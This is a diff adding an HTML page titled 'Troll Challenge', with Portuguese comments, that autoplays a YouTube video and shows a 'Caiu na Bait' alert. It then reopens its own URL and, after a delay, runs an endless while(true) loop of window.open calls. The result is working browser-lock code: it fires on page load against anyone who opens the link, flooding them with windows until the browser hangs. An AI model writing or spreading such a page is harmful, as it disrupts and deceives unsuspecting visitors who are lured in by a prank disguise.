@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/png" href="https://i.pinimg.com/originals/86/0b/6a/860b6a0380804e05ac748c45427d4a3f.png">
+  <title>Troll Challenge</title>
+</head>
+<body>
+  <style>
+    *{
+      margin: 0;
+      padding: 0;
+    }
+    #player{
+
+      height: 100vh;
+      width: 100%;
+      overflow: hidden;
+  }
+  </style>
+  
+  <div id="player"></div>
+
+  <script>
+    var isPlayerReady = false;
+    var travaOn = false;
+    var linkDirection = window.location.href;
+
+    // API YouTube
+    var tag = document.createElement('script');
+    tag.src = "https://www.youtube.com/iframe_api";
+    var firstScriptTag = document.getElementsByTagName('script')[0];
+    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+
+    // Player vídeo verificação de integridade da API
+    function createYouTubePlayer() {
+      player = new YT.Player('player', {
+          videoId: 'N4Q4j1oSdUU',
+          events: {
+              'onReady': onPlayerReady
+          }
+      });
+    }
+
+    // Verificação de Disponibilidade
+    function onPlayerReady(event) {
+        event.target.playVideo();
+        isPlayerReady = true;
+    }
+
+    function loadPage() {
+      if (isPlayerReady) {
+          function openNewWindow() {
+            var newWindow = window.open(linkDirection, '_blank');
+            setTimeout(function() {newWindow.location.href = linkDirection;
+            }, 100);
+            setTimeout(function(){
+              travaOn = true;
+            }, 3000)
+          }
+          function showAlert() {
+            window.alert('Caiu na Bait');
+            openNewWindow();
+          }
+          showAlert();
+    } else {
+      setTimeout(loadPage, 200);
+    }
+  }
+  
+  function travaFull(){
+    if (travaOn) {
+      while(true){
+        console.log("BAIT");
+        window.open(linkDirection, '_blank');
+      }
+    }else{      
+      console.log(travaOn);      
+      setTimeout(travaFull, 2000);           
+    }
+  }
+
+  // Função para criar o player de vídeo
+  function onYouTubeIframeAPIReady() {
+      createYouTubePlayer();
+      loadPage();
+      travaFull();
+  }
+</script>
+
+</body>
+</html>
